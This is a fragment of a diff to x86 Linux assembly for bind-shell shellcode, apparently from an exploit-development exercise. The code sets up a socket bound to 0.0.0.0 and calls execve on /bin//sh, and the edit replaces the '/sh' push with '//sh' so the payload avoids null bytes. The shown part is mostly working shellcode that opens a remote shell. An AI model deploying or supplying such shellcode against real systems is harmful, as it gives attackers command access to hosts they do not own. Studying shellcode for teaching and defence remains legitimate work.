@@ -47,7 +47,7 @@ mov    edi,eax
 mov    bl,0x2
 ; bind function is : int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
 ; again we push onto the stack to create an array / struct   
-; push 0x0 
+; push 0x0 for 0.0.0.0 
 xor    esi,esi
 push   esi
 ; we send the port in the struct 
@@ -113,14 +113,14 @@ jns    loop
 
 
 
-; syscall "execve", with arguments /bin/sh  and a null string for envp argument  
+; syscall "execve", with arguments /bin//sh and a null string for envp argument  
 ; function int execve(const char *filename, char *const argv[],char *const envp[]);
 mov    al,0xb
 ; push 0x0 
 xor esi,esi
 push   esi 
-; "/bin/sh" 
-push   0x0068732f ; "/sh" 
+; "/bin//sh" to avoid null byte on 4 bytes 
+push   0x68732f2f ; "//sh" 
 push   0x6e69622f ; "/bin"
 ; we create a string pointer 
 mov    ebx,esp
